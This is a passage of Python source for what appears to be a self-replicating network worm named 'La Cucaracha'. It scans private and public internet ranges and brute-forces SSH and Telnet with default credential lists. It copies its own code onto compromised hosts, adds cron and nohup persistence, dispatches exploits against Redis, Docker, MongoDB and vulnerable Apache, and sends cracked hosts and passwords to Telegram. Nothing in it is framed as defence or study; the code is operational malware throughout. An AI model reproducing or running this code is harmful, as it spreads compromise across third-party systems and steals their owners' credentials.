            f"║  ⏱️ {phase_results['total_time']:.1f}s   💀 {phase_results['exploitation']} pwned\n"
            f"║  🖥️ {phase_results['fingerprinted']} fingerprinted   🚀 {phase_results['deployment']} deployed\n"
            f"║  🕸️ {phase_results['mesh_spread']} mesh   🔄 {phase_results['lateral_moves']} lateral\n"
            f"║  📡 ICMP {phase_results['icmp_sweep']}   🔍 TCP {phase_results['tcp_sweep']}\n"
            f"╚{'═'*30}╝\n"
            "```"
        )

        return {
            "phases": phase_results,
            "stats": self.db.stats(),
            "total_targets_exploited": phase_results["exploitation"] + phase_results["mesh_spread"],
        }

    # ---- Self-Replication Engine ----

    def self_replicate(self, target_ip: str, target_port: int = 22) -> bool:
        """Deploy a copy of this worm to a target host via SSH."""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            creds = self.db.execute(
                "SELECT username, password FROM credentials WHERE ip=?", (target_ip,)
            ).fetchall()
            if not creds:
                creds = [("root", "admin"), ("root", "1234"), ("root", "root"),
                         ("admin", "admin"), ("root", "")]
            for user, pw in creds:
                try:
                    client.connect(target_ip, username=user, password=pw, timeout=10)
                except Exception:
                    continue
                # Read self source
                worm_paths = [
                    "/opt/hermes/LaCucaracha.py",
                    "/opt/hermes/worm_mesh_engine.py",
                    __file__,
                ]
                source = b""
                for wp in worm_paths:
                    try:
                        with open(wp, "rb") as f:
                            source = f.read()
                        break
                    except Exception:
                        continue
                if not source:
                    source = b'print("worm placeholder")'
                b64_source = base64.b64encode(source).decode()
                chunk_size = 4096
                chunks = [b64_source[i:i+chunk_size] for i in range(0, len(b64_source), chunk_size)]
                client.exec_command("mkdir -p /opt/.worm")
                client.exec_command(f"echo '{chunks[0]}' > /tmp/.worm_b64")
                for chunk in chunks[1:]:
                    client.exec_command(f"echo '{chunk}' >> /tmp/.worm_b64")
                client.exec_command("base64 -d /tmp/.worm_b64 > /opt/.worm/LaCucaracha.py")
                client.exec_command("chmod +x /opt/.worm/LaCucaracha.py")
                client.exec_command("rm -f /tmp/.worm_b64")
                client.exec_command(
                    "(crontab -l 2>/dev/null; echo '*/5 * * * * /usr/bin/python3 /opt/.worm/LaCucaracha.py --auto --replicate --batch 50 --hops 3 2>&1 | logger -t worm-replica') | crontab -"
                )
                client.exec_command(
                    "nohup /usr/bin/python3 /opt/.worm/LaCucaracha.py --auto --replicate --batch 50 --hops 3 > /dev/null 2>&1 &"
                )
                client.close()
                self.db.log(f"Worm replicant deployed to {target_ip} via {user}", "INFO", "replicate")
                return True
        except Exception as exc:
            self.db.log(f"Self-replication to {target_ip} failed: {exc}", "WARNING", "replicate")
        return False

    def _broadcast_self_to_subnet(self, subnet: str, max_hosts: int = 50) -> int:
        """Self-replicate to discovered hosts in a subnet."""
        deployed = 0
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            hosts = [str(ip) for ip in list(network.hosts())[:max_hosts]]
            for ip in hosts:
                if self._stop_flag:
                    break
                if self.self_replicate(ip):
                    deployed += 1
                time.sleep(random.uniform(0.5, 2.0))
        except Exception as exc:
            self.db.log(f"Broadcast self-replicate failed: {exc}", "WARNING", "replicate")
        return deployed

    # ====================================================================
    # TELEGRAM REPORTING
    # ====================================================================

    def _send_report(self, message: str) -> None:
        """Send a report via Telegram callback, respecting rate-limit."""
        now = time.time()
        if self.telegram_callback and (now - self._last_report) >= self._report_interval:
            try:
                self.telegram_callback(message)
                self._last_report = now
            except Exception:
                pass  # Non-blocking — never let reporting crash the hunt

    def _send_action_report(self, action: str, target: str, status: str, detail: str = "") -> None:
        """Per-action Telegram report — NO rate limit, every move reported.
        
        Uses the SmartDecisionEngine's report_action method for consistent
        formatting and immediate delivery. Every scan, exploit attempt,
        deploy, spread, trade, and sleep is visible in real-time.
        """
        if not self._action_reports:
            return
        if self.decision_engine:
            self.decision_engine.report_action(action, target, status, detail)

    def _build_epoch_report(self, epoch: int, state: str, stats: Dict,
                            targets_this_epoch: int = 0,
                            pwned_this_epoch: int = 0,
                            mesh_this_epoch: int = 0,
                            creds_pool: int = 0,
                            top_targets: Optional[List[Dict]] = None,
                            service_breakdown: Optional[Dict] = None) -> str:
        """Build a beautiful epoch status report for Telegram."""
        state_emoji = {
            "DISCOVER": "🔍", "EXPLOIT": "💥", "REPLICATE": "🧬",
            "SPREAD": "🕸️", "TRADE": "🔄", "SLEEP": "💤"
        }
        emoji = state_emoji.get(state, "⚡")
        now_str = time.strftime("%H:%M:%S")

        lines = [
            f"```",
            f"╔═══ 🐛 La Cucaracha — Epoch {epoch} ═══╗",
            f"║  {emoji} State : {state:<12}   ⌛ {now_str}",
            f"║  🎯 Found  : {stats['targets_found']:<6}    💀 Pwned: {stats['targets_exploited']}",
            f"║  🧬 Replic : {stats['replicants_deployed']:<6}    🕸️ Mesh : {stats['mesh_spreads']}",
        ]

        if targets_this_epoch:
            lines.append(f"║  📡 Batch  : {targets_this_epoch} targets this epoch")
        if pwned_this_epoch:
            lines.append(f"║  🔓 Pwned  : {pwned_this_epoch} this epoch 🔥")
        if mesh_this_epoch:
            lines.append(f"║  🕸️ Spread : {mesh_this_epoch} mesh joins this epoch")
        if creds_pool:
            lines.append(f"║  🔑 Creds  : {creds_pool} in pool")

        # Service breakdown (top ports/services found)
        if service_breakdown:
            lines.append(f"║")
            lines.append(f"║  📊 SERVICES:")
            for svc, count in list(service_breakdown.items())[:6]:
                lines.append(f"║     • {svc:<12}: {count}")
        elif top_targets:
            # Fallback: show top targets instead
            lines.append(f"║")
            lines.append(f"║  🎯 TOP TARGETS:")
            for t in top_targets[:3]:
                ip = t.get("ip", "?")
                port = t.get("port", "?")
                svc = t.get("service", "?")
                lines.append(f"║     {ip}:{port} ({svc})")

        # Exploit details for EXPLOIT state
        if pwned_this_epoch and top_targets:
            lines.append(f"║")
            lines.append(f"║  💀 PWNED HOSTS:")
            for t in top_targets[:4]:
                ip = t.get("ip", "?")
                port = t.get("port", "?")
                svc = t.get("service", "?")
                user = t.get("username", "")
                pwd = t.get("password", "")
                if user and pwd:
                    lines.append(f"║     {ip}:{port} | {svc} | {user}:{pwd}")
                else:
                    lines.append(f"║     {ip}:{port} | {svc}")

        lines.append(f"╚{'═'*33}╝")
        lines.append("```")
        return "\n".join(lines)

    def _build_pwn_report(self, ip: str, port: int, service: str,
                          username: str, password: str) -> str:
        """Build a compact pwn alert for Telegram."""
        return (
            f"```\n"
            f"╔══ 🔓 PWNED ══╗\n"
            f"║ Target : {ip:<21}\n"
            f"║ Port   : {port:<5}  {service:<14}\n"
            f"║ Cred   : {username}:{password}\n"
            f"╚{'═'*30}╝\n"
            f"```"
        )

    def _get_service_breakdown(self) -> Dict[str, int]:
        """Query DB for service/port distribution of discovered targets."""
        try:
            if not hasattr(self, 'db') or not self.db:
                return {}
            rows = self.db.execute(
                "SELECT service, COUNT(*) as cnt FROM targets "
                "WHERE service != '' GROUP BY service ORDER BY cnt DESC LIMIT 10"
            ).fetchall()
            return {r['service']: r['cnt'] for r in rows}
        except Exception:
            return {}

    def _get_recent_pwned(self, limit: int = 4) -> List[Dict]:
        """Get recently exploited targets with credentials for reporting."""
        try:
            if not hasattr(self, 'db') or not self.db:
                return []
            rows = self.db.execute(
                "SELECT t.ip, t.port, t.service, c.username, c.password "
                "FROM targets t "
                "LEFT JOIN credentials c ON c.target_ip = t.ip "
                "WHERE t.exploited = 1 "
                "ORDER BY t.last_seen DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(r) for r in rows]
        except Exception:
            return []
    
    def _build_summary_report(self, stats: Dict, creds_pool: int = 0,
                              db_targets: int = 0, uptime_secs: float = 0) -> str:
        """Build a final summary report."""
        uptime_m = int(uptime_secs / 60) if uptime_secs else 0
        lines = [
            f"```\n",
            f"╔══ ✅ Autonomous Hunt Complete ══╗",
            f"║  🔄 Epochs     : {stats['epochs']}",
            f"║  🎯 Found      : {stats['targets_found']}",
            f"║  💀 Exploited  : {stats['targets_exploited']}",
            f"║  🧬 Replicants : {stats['replicants_deployed']}",
            f"║  🕸️ Mesh       : {stats['mesh_spreads']}",
            f"║  🔑 Creds      : {creds_pool}",
            f"║  📡 DB Targets : {db_targets}",
        ]
        if uptime_m:
            lines.append(f"║  ⏱️ Uptime     : {uptime_m}m")
        lines.append(f"╚{'═'*29}╝")
        lines.append("```")
        return "\n".join(lines)

    # ---- Autonomous Navigation State Machine ----

    def autonomous_navigation(self, discovery_only: bool = False,
                              max_epochs: int = 100) -> Dict:
        """
        Full autonomous navigation — IF/THEN decision-driven.
        
        Every action in the kill chain reports to Telegram in real-time:
        - DISCOVER: sweep subnet → report alive hosts
        - EXPLOIT: try creds → report pwns or failures
        - DEPLOY: push payload → report deployed count
        - SPREAD: mesh propagation → report new nodes
        - TRADE: credentials + mutation → report trades
        - SLEEP: adaptive wait based on hit streak
        
        The SmartDecisionEngine evaluates each result and decides the next
        action using if/then/else rules. Empty scans rotate subnets.
        Hot streaks tighten the cycle. Cold streaks extend rest periods.
        """
        state = "DISCOVER"
        epoch = 0
        stats = {"epochs": 0, "targets_found": 0, "targets_exploited": 0,
                 "replicants_deployed": 0, "mesh_spreads": 0}
        self._start_time = time.time()
        
        # Ensure decision engine is wired
        if not self.decision_engine:
            self.decision_engine = SmartDecisionEngine(telegram_callback=self.telegram_callback)
        elif self.telegram_callback and not self.decision_engine.tg:
            self.decision_engine.tg = self.telegram_callback
        
        # 🐉 Wire aggressive/predator mode flags into decision engine
        if self.aggressive_mode or getattr(self, 'predator_mode', False):
            self.decision_engine.aggressive = self.aggressive_mode
            self.decision_engine.predator = getattr(self, 'predator_mode', False)
            mode_str = 'PREDATOR 🐉' if self.decision_engine.predator else 'AGGRESSIVE 🔥'
            self.db.log(f"[AUTO] {mode_str} mode engaged", "INFO", "auto")
        
        # Spawn autonomous subnets if none exist in DB
        try:
            db_subnets = self.db.get_subnets(active_only=True)
            if not db_subnets or len(db_subnets) < 3:
                self.db.log("[AUTO] No active subnets — spawning defaults", "INFO", "auto")
                default_subnets = [
                    "192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12",
                    "23.0.0.0/8", "31.0.0.0/8", "45.0.0.0/8",
                    "89.0.0.0/8", "91.0.0.0/8", "95.0.0.0/8",
                    "103.0.0.0/8", "105.0.0.0/8", "185.0.0.0/8",
                ]
                for sub in default_subnets:
                    self.db.add_subnet(sub)
        except Exception:
            pass
        
        self._send_action_report("ALERT", "Autonomous Navigation", "BOOT", 
                                 f"Decision engine online — {max_epochs} max epochs")
        
        while epoch < max_epochs and not self._stop_flag:
            epoch += 1
            log.info(f"{'='*20} Auto Epoch {epoch} — State: {state}")
            
            if state == "DISCOVER":
                # ===== DISCOVER PHASE =====
                targets = []
                targets_found = 0
                subnet_for_scan = None
                try:
                    # Pick a subnet from DB or use default
                    active_subnets = self.db.get_subnets(active_only=True)
                    if active_subnets:
                        import random as _rand
                        subnet_entry = _rand.choice(active_subnets)
                        if isinstance(subnet_entry, dict):
                            subnet_for_scan = subnet_entry.get('subnet', subnet_entry.get('cidr', '0.0.0.0/0'))
                        else:
                            subnet_for_scan = str(subnet_entry)
                    else:
                        subnet_for_scan = "0.0.0.0/0"
                    
                    self._send_action_report("DISCOVER", subnet_for_scan, "SCANNING", 
                                             "ICMP sweep + TCP probe")
                    
                    # Run reconnaissance
                    targets = self.recon_engine.autonomous_scan(
                        subnet=subnet_for_scan
                    ) if hasattr(self.recon_engine, 'autonomous_scan') else []
                    
                    targets_found = len(targets) if targets else 0
                    stats["targets_found"] += targets_found
                    
                    if targets_found > 0:
                        # Show discovered hosts
                        host_ips = [t.get('ip', str(t)) for t in (targets or [])[:5]]
                        self._send_action_report("SCAN", f"{targets_found} hosts", "SUCCESS",
                                                 f"Subnet: {subnet_for_scan}")
                        for ip in host_ips:
                            self._send_action_report("TCP", ip, "ALIVE", "Open ports detected")
                        
                        decision_result = {
                            'count': targets_found,
                            'success': True,
                            'targets': targets or [],
                        }
                    else:
                        self._send_action_report("SCAN", subnet_for_scan, "EMPTY", 
                                                 "No hosts responded")
                        decision_result = {'count': 0, 'success': False}
                        
                except Exception as e:
                    self._send_action_report("SCAN", subnet_for_scan or "?", "FAILED", str(e)[:60])
                    decision_result = {'count': 0, 'success': False, 'errors': 1}
                
                # Let decision engine decide next state
                decision_result['targets'] = [t.get('ip', str(t)) for t in (targets or [])[:10]]
                next_state, params = self.decision_engine.decide("DISCOVER", decision_result)
                state = next_state
                
                # Report epoch
                self._send_report(self._build_epoch_report(
                    epoch, "DISCOVER", stats,
                    targets_this_epoch=targets_found,
                    creds_pool=len(getattr(self.exploit_engine, 'cred_pairs', [])),
                    service_breakdown=self._get_service_breakdown()))
                    
            elif state == "EXPLOIT":
                # ===== EXPLOIT PHASE =====
                results = []
                try:
                    self._send_action_report("EXPLOIT", "Batch", "START", 
                                             "Running credential spray + vuln scan")
                    
                    results = self._phase_exploitation(batch_size=200, skip_mc=True)
                    # Store for DEPLOY phase to use
                    self._last_exploit_results = results
                    pwned = len(results)
                    stats["targets_exploited"] += pwned
                    
                    if pwned > 0:
                        # Report each pwn individually
                        for r in results:
                            ip = getattr(r, 'target_ip', '') or r.get('target_ip', '')
                            port = getattr(r, 'target_port', 22)
                            user = getattr(r, 'username', '')
                            pwd = getattr(r, 'credential', ('', ''))[1] if hasattr(r, 'credential') and r.credential else ''
                            if ip:
                                self._send_action_report("PWN", f"{ip}:{port}", "SUCCESS",
                                                         f"SSH | {user}:{pwd}")
                        
                        decision_result = {
                            'count': pwned,
                            'success': True,
                            'targets': results,
                        }
                    else:
                        self._send_action_report("EXPLOIT", "Batch", "NO PWN",
                                                 "No creds matched or vulns found")
                        # BUG 2 FIX: Check for partial cred matches (auth accepted user, rejected pass)
                        partial_match = bool(getattr(self, '_partial_creds_seen', False))
                        self._partial_creds_seen = False
                        decision_result = {'count': 0, 'success': False, 'partial': partial_match}
                        
                except Exception as e:
                    self._send_action_report("EXPLOIT", "Batch", "ERROR", str(e)[:60])
                    decision_result = {'count': 0, 'success': False, 'errors': 10}
                
                next_state, params = self.decision_engine.decide("EXPLOIT", decision_result)
                state = next_state
                
                self._send_report(self._build_epoch_report(
                    epoch, "EXPLOIT", stats,
                    pwned_this_epoch=len(results),
                    top_targets=self._get_recent_pwned(limit=4),
                    creds_pool=len(getattr(self.exploit_engine, 'cred_pairs', []))))
                    
            elif state == "DEPLOY":
                # ===== DEPLOY PHASE =====
                deployed = 0
                try:
                    # BUG 1+5 FIX: Use actual pwned hosts from last exploit phase
                    pwned_hosts = getattr(self, '_last_exploit_results', [])
                    if not pwned_hosts:
                        # Fallback: query database for recently exploited targets
                        recent = self._get_recent_pwned(limit=10)
                        if recent:
                            # Build pseudo-ExploitResults from DB
                            pwned_hosts = []
                            for r in recent:
                                er = ExploitResult(
                                    success=True,
                                    target_ip=r.get('ip', ''),
                                    target_port=int(r.get('port', 0)),
                                    username=r.get('username', ''),
                                    credential=(r.get('username',''), r.get('password','')),
                                )
                                pwned_hosts.append(er)
                    
                    if pwned_hosts:
                        self._send_action_report("DEPLOY", "Payload", "START",
                                                 f"Deploying to {len(pwned_hosts)} pwned hosts")
                        reports = self._phase_deployment(pwned_hosts)
                        deployed = sum(1 for r in reports if getattr(r, 'success', False))
                    else:
                        self._send_action_report("DEPLOY", "Skip", "NO TARGETS",
                                                 "No pwned hosts to deploy to")
                        deployed = 0
                    stats["replicants_deployed"] += deployed
                    
                    if deployed > 0:
                        self._send_action_report("DEPLOY", f"{deployed} agents", "SUCCESS",
                                                 "Replicants deployed")
                    else:
                        self._send_action_report("DEPLOY", "Broadcast", "FAILED",
                                                 "No deployment targets available")
                        
                except Exception as e:
                    self._send_action_report("DEPLOY", "Payload", "ERROR", str(e)[:60])
                    deployed = 0
                
                decision_result = {'count': deployed, 'success': deployed > 0}
                next_state, params = self.decision_engine.decide("DEPLOY", decision_result)
                state = next_state
                
            elif state == "SPREAD":
                # ===== SPREAD PHASE =====
                spread = 0
                try:
                    self._send_action_report("SPREAD", "Mesh", "START",
                                             "Propagating through pwned mesh")
                    
                    spread = self._phase_mesh_spread(max_hops=2)
                    stats["mesh_spreads"] += spread
                    
                    if spread > 0:
                        self._send_action_report("SPREAD", f"{spread} nodes", "SUCCESS",
                                                 "Mesh expanded")
                    else:
                        self._send_action_report("SPREAD", "Propagation", "EMPTY",
                                                 "No new mesh nodes")
                        
                except Exception as e:
                    self._send_action_report("SPREAD", "Mesh", "ERROR", str(e)[:60])
                    spread = 0
                
                decision_result = {'count': spread, 'success': spread > 0}
                next_state, params = self.decision_engine.decide("SPREAD", decision_result)
                state = next_state
                
            elif state == "TRADE":
                # ===== TRADE & MUTATION PHASE =====
                trades, mutations = 0, 0
                try:
                    self._send_action_report("TRADE", "Creds + Payloads", "START",
                                             "Exchanging creds, mutating payloads")
                    
                    tm = self._phase_trade_mutation()
                    if isinstance(tm, dict):
                        trades = tm.get("trades", 0)
                        mutations = tm.get("mutations", 0)
                        
                    if trades > 0 or mutations > 0:
                        self._send_action_report("TRADE", f"{trades} trades", "COMPLETE",
                                                 f"{mutations} payload mutations")
                    else:
                        self._send_action_report("TRADE", "Exchange", "IDLE",
                                                 "Nothing to trade or mutate")
                        
                except Exception as e:
                    self._send_action_report("TRADE", "Exchange", "ERROR", str(e)[:60])
                
                decision_result = {
                    'count': trades + mutations,
                    'success': (trades + mutations) > 0,
                    'trades': trades,
                    'mutations': mutations,
                }
                next_state, params = self.decision_engine.decide("TRADE", decision_result)
                state = next_state
                
            elif state == "SLEEP":
                # ===== SLEEP PHASE (adaptive) =====
                sleep_time = params.get('duration', 30) if isinstance(params, dict) else 30
                reason = params.get('reason', 'Standard rest') if isinstance(params, dict) else 'Standard rest'
                
                self._send_action_report("SLEEP", f"{sleep_time}s", reason,
                                         f"Epoch {epoch} complete — {len(self.decision_engine.action_history) if self.decision_engine and hasattr(self.decision_engine, 'action_history') else '?'} actions logged")
                
                self._send_report(self._build_epoch_report(
                    epoch, "SLEEP", stats,
                    targets_this_epoch=0, pwned_this_epoch=0, mesh_this_epoch=0,
                    creds_pool=len(getattr(self.exploit_engine, 'cred_pairs', [])),
                    service_breakdown=self._get_service_breakdown()))
                
                # Sleep with interrupt check
                for _ in range(sleep_time):
                    if self._stop_flag:
                        break
                    time.sleep(1)
                
                decision_result = {
                    'count': 0,
                    'success': False,
                    'consecutive_empty': self.decision_engine.consecutive_empty if self.decision_engine else 0,
                    'consecutive_hits': self.decision_engine.consecutive_hits if self.decision_engine else 0,
                }
                next_state, params = self.decision_engine.decide("SLEEP", decision_result)
                state = next_state
                stats["epochs"] = epoch
            
            else:
                # Unknown state — reset
                self._send_action_report("ALERT", state, "UNKNOWN STATE", "Resetting to DISCOVER")
                state = "DISCOVER"
        
        # ===== FINAL SUMMARY =====
        self.db.log(f"[AUTO] Autonomous navigation complete: {stats['epochs']} epochs", "INFO", "auto")
        
        # Final summary to Telegram
        self._send_action_report("ALERT", "Navigation Complete", "SHUTDOWN",
                                 f"{stats['epochs']} epochs | {stats['targets_found']} found | {stats['targets_exploited']} pwned | {stats['replicants_deployed']} deployed | {stats['mesh_spreads']} spread")
        
        db_stats = self.db.stats()
        self._send_report(self._build_summary_report(
            stats,
            creds_pool=len(getattr(self.exploit_engine, 'cred_pairs', [])),
            db_targets=db_stats.get('targets', 0),
            uptime_secs=time.time() - getattr(self, '_start_time', time.time())))
        
        return stats

    # ---- Deploy cycle wrappers (for backward compat) ----

    def run_reconnaissance(self, subnet: str = "0.0.0.0/0", **kw) -> int:
        return self._phase_reconnaissance(subnet=subnet)

    def run_exploitation(self, batch_size: int = 50, skip_mc: bool = False) -> List[ExploitResult]:
        return self._phase_exploitation(batch_size=batch_size, skip_mc=skip_mc)

    def run_payload_generation(self, callback_ip: str = "", callback_port: int = 0) -> List[Dict]:
        return self._phase_payload_generation(callback_ip=callback_ip, callback_port=callback_port)

    def run_deployment(self, exploit_results: List[ExploitResult], payload: Optional[Dict] = None) -> List[DeploymentReport]:
        return self._phase_deployment(exploit_results, payload)

    def run_mesh_spread(self, max_hops: int = 3) -> int:
        return self._phase_mesh_spread(max_hops=max_hops)

    def run_trading_and_mutation(self) -> Dict:
        return self._phase_trade_mutation()

    def run_docker_icmp_bypass_phase(self) -> Dict:
        return self._phase_docker_icmp_bypass()

    def run_pmtu_poison_phase(self) -> Dict:
        return self._phase_pmtu_poison()

    # ========================================================================
    # KILL CHAIN WORKER FUNCTIONS (TCP, Fingerprinting, Scoring, Exploitation, Lateral)
    # ========================================================================

    def _discover_local_subnets(self) -> List[str]:
        """Auto-detect local subnets by enumerating network interfaces."""
        subnets = []
        try:
            # Try 'ip addr' command
            result = subprocess.run(
                ["ip", "addr"], capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "inet " in line and "127.0.0.1" not in line:
                    parts = line.strip().split()
                    for p in parts:
                        if "/" in p and "." in p:
                            subnets.append(p)
        except Exception:
            pass
        if not subnets:
            try:
                import netifaces
                for iface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            ip = addr.get("addr", "")
                            mask = addr.get("netmask", "")
                            if ip and mask and not ip.startswith("127."):
                                # Calculate CIDR
                                import ipaddress
                                from ipaddress import IPv4Network
                                network = IPv4Network(f"{ip}/{mask}", strict=False)
                                subnets.append(str(network))
            except ImportError:
                pass
        if not subnets:
            subnets = ["192.168.1.0/24", "10.0.0.0/24", "172.16.0.0/24"]
        return subnets

    def _tcp_scan_worker(self, ip: str, ports: List[int]) -> List[Dict]:
        """TCP connect scan against given ports. Returns list of {ip, port, service} dicts."""
        open_ports: List[Dict] = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    open_ports.append({
                        "ip": ip,
                        "port": port,
                        "service": self._guess_service(port, "")
                    })
            except Exception:
                continue
        return open_ports

    def _guess_service(self, port: int, banner: str) -> str:
        """Guess service name from port and banner."""
        service_map = {
            22: "ssh", 23: "telnet", 80: "http", 443: "https",
            8080: "http", 8443: "https", 3306: "mysql", 5432: "postgresql",
            6379: "redis", 27017: "mongodb", 2375: "docker", 2376: "docker",
            1883: "mqtt", 8883: "mqtts", 500: "ike", 4500: "ike",
            9200: "elasticsearch", 9300: "elasticsearch",
            3389: "rdp", 5900: "vnc", 21: "ftp", 25: "smtp",
            1433: "mssql", 1521: "oracle", 2049: "nfs",
            111: "rpc", 135: "msrpc", 139: "netbios", 445: "smb",
            161: "snmp", 162: "snmp-trap", 5060: "sip",
            110: "pop3", 143: "imap", 993: "imaps", 995: "pop3s",
            5985: "winrm", 5986: "winrm-ssl", 11211: "memcached",
            9090: "http-alt", 9000: "http-alt",
            7547: "cwmp", 2323: "telnet-alt", 5555: "adb",
            2222: "ssh-alt", 8291: "routeros", 8728: "routeros-api",
            9100: "http-alt", 5000: "http-alt", 5001: "http-alt"
        }
        if port in service_map:
            return service_map[port]
        banner_lower = banner.lower()
        if "ssh" in banner_lower: return "ssh"
        elif "telnet" in banner_lower: return "telnet"
        elif "http" in banner_lower or "html" in banner_lower: return "http"
        elif "mysql" in banner_lower: return "mysql"
        elif "postgres" in banner_lower: return "postgresql"
        elif "redis" in banner_lower: return "redis"
        elif "mongo" in banner_lower: return "mongodb"
        elif "docker" in banner_lower: return "docker"
        return f"port-{port}"

    def _fingerprint_worker(self, ip: str, ports: List[int]) -> Dict:
        """Deep fingerprint a host: OS detection, service fingerprinting, banner grabbing."""
        result = {"ip": ip, "os_guess": "unknown", "os_confidence": 0.0, "services": {}, "ttl": 64, "hostname": ""}
        try:
            icmp = ICMPEngine(self.db, timeout=2)
            fp = icmp.icmp_os_fingerprint(ip)
            if fp:
                result["os_guess"] = fp.get("os_guess", "unknown")
                result["os_confidence"] = fp.get("confidence", 0.0)
                result["ttl"] = fp.get("ttl", 64)
        except Exception:
            pass
        for port in ports[:10]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, port))
                banner = ""
                try:
                    sock.send(b"\r\n")
                    banner = sock.recv(1024).decode(errors="ignore")[:500]
                except:
                    pass
                if port in [80, 443, 8080, 8443, 8000, 8008, 9000]:
                    try:
                        import ssl
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(sock, server_hostname=ip)
                        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        http_banner = s.recv(2048).decode(errors="ignore")[:500]
                        if http_banner: banner = http_banner
                        s.close()
                    except:
                        pass
                service_name = self._guess_service(port, banner)
                server = ""
                if "Server:" in banner:
                    for line in banner.split("\n"):
                        if "Server:" in line:
                            server = line.split("Server:")[1].strip()
                            break
                result["services"][port] = {"name": service_name, "banner": banner[:200], "server": server}
                sock.close()
            except Exception:
                continue
        return result

    def _score_targets(self, targets: List[Dict]) -> List[Dict]:
        """Score targets based on multiple factors for prioritization."""
        service_weights = {"ssh": 10, "telnet": 9, "http": 7, "https": 7,
                           "mysql": 10, "postgresql": 10, "redis": 9, "mongodb": 9,
                           "docker": 10, "elasticsearch": 8, "memcached": 7,
                           "vnc": 7, "rdp": 8, "ftp": 6, "smtp": 5, "mqtt": 6,
                           "ike": 7, "unknown": 3}
        os_weights = {"linux": 8, "windows": 9, "cisco": 7, "embedded": 6, "unknown": 3}
        scored = []
        for target in targets:
            ip = target.get("ip")
            port = target.get("port")
            service = target.get("service", "unknown")
            banner = target.get("banner", "")
            score = 0
            service_lower = service.lower()
            for key, weight in service_weights.items():
                if key in service_lower:
                    score += weight
                    break
            else:
                score += 3
            os_guess = target.get("os_guess", "unknown").lower()
            for key, weight in os_weights.items():
                if key in os_guess:
                    score += weight
                    break
            if banner:
                if any(x in banner.lower() for x in ["version", "v.", "release", "build"]):
                    score += 5
                if any(x in banner.lower() for x in ["apache", "nginx", "iis", "tomcat", "jetty"]):
                    score += 3
                score += min(len(banner) // 50, 5)
            if port in [22, 23, 3306, 5432, 6379, 27017]:
                score += 5
            target["score"] = score
            scored.append(target)
        return scored

    def _exploit_target_with_fingerprint(self, target: Dict) -> ExploitResult:
        """Exploit target using fingerprint data for targeted exploitation."""
        ip = target.get("ip")
        port = int(target.get("port", 22))
        service = target.get("service", "").lower()
        os_guess = target.get("os_guess", "").lower()
        banner = target.get("banner", "").lower()
        if port == 22 or "ssh" in service:
            creds = self._get_os_specific_creds(os_guess) if os_guess else None
            if creds:
                result = self.exploit_engine._ssh_brute_force(ip, port, creds=creds)
                if result.success: return result
            return self.exploit_engine._ssh_brute_force(ip, port)
        elif port == 23 or "telnet" in service:
            creds = self._get_os_specific_creds(os_guess) if os_guess else None
            if creds:
                result = self.exploit_engine._telnet_auth_bypass(ip, port, creds=creds)
                if result.success: return result
            return self.exploit_engine._telnet_auth_bypass(ip, port)
        elif "mysql" in service or port == 3306:
            return self.exploit_engine._mysql_exploit(ip, port)
        elif "postgres" in service or port == 5432:
            return self.exploit_engine._postgres_exploit(ip, port)
        elif "redis" in service or port == 6379:
            return self.exploit_engine._redis_exploit(ip, port)
        elif "mongo" in service or port == 27017:
            return self.exploit_engine._mongodb_exploit(ip, port)
        elif "docker" in service or port in [2375, 2376]:
            return self.exploit_engine._docker_api_exploit(ip, port)
        elif "http" in service or port in [80, 443, 8080, 8443]:
            return self._web_exploit_with_fingerprint(ip, port, banner)
        elif "ike" in service or port == 500:
            return self.exploit_engine._checkpoint_vpn_probe(ip, 500)
        elif "mqtt" in service or port == 1883:
            return self.exploit_engine._mqtt_wildcard_enum(ip, 1883)
        return self.exploit_engine.exploit_target({"ip": ip, "port": port, "service": service})

    def _get_os_specific_creds(self, os_guess: str) -> List[Tuple[str, str]]:
        """Get OS-specific credential pairs for targeted attacks."""
        os_lower = os_guess.lower()
        if "linux" in os_lower:
            return [("root", "root"), ("root", "admin"), ("root", "password"),
                    ("root", "123456"), ("root", "toor"), ("admin", "admin"),
                    ("root", "pass"), ("root", "default"), ("root", "changeme"),
                    ("root", "Welcome1"), ("root", "Admin@2026")]
        elif "windows" in os_lower:
            return [("Administrator", "admin"), ("Administrator", "password"),
                    ("admin", "admin"), ("admin", "123456"), ("Administrator", "123456"),
                    ("user", "user"), ("Administrator", "P@ssw0rd"),
                    ("Administrator", "Welcome1"), ("Administrator", "Admin@2026")]
        elif "cisco" in os_lower:
            return [("cisco", "cisco"), ("admin", "cisco"), ("root", "cisco"),
                    ("cisco", "12345"), ("admin", "admin"), ("cisco", "password")]
        elif "embedded" in os_lower or "busybox" in os_lower:
            return [("root", "root"), ("root", "admin"), ("admin", "admin"),
                    ("root", "xc3511"), ("admin", "admin123"), ("root", "vizxv"),
                    ("root", "anko"), ("root", "Zte521"), ("root", "realtek"),
                    ("root", "default"), ("root", "pass"), ("root", "12345"),
                    ("root", "54321"), ("root", "7ujMko0vizxv"), ("root", "system")]
        else:
            return [("root", "root"), ("root", "admin"), ("admin", "admin"),
                    ("root", "password"), ("admin", "password"), ("root", "123456"),
                    ("admin", "123456"), ("root", "toor"), ("root", ""), ("admin", ""),
                    ("root", "pass"), ("root", "default"), ("root", "changeme"),
                    ("root", "Welcome1"), ("root", "Admin@2026")]

    def _web_exploit_with_fingerprint(self, ip: str, port: int, banner: str) -> ExploitResult:
        """Web exploitation with banner fingerprinting."""
        banner_lower = banner.lower()
        if "apache" in banner_lower and "2.4.49" in banner_lower:
            return self._apache_path_traversal(ip, port)
        elif "nginx" in banner_lower:
            return self._nginx_exploit(ip, port)
        elif "iis" in banner_lower:
            return self._iis_exploit(ip, port)
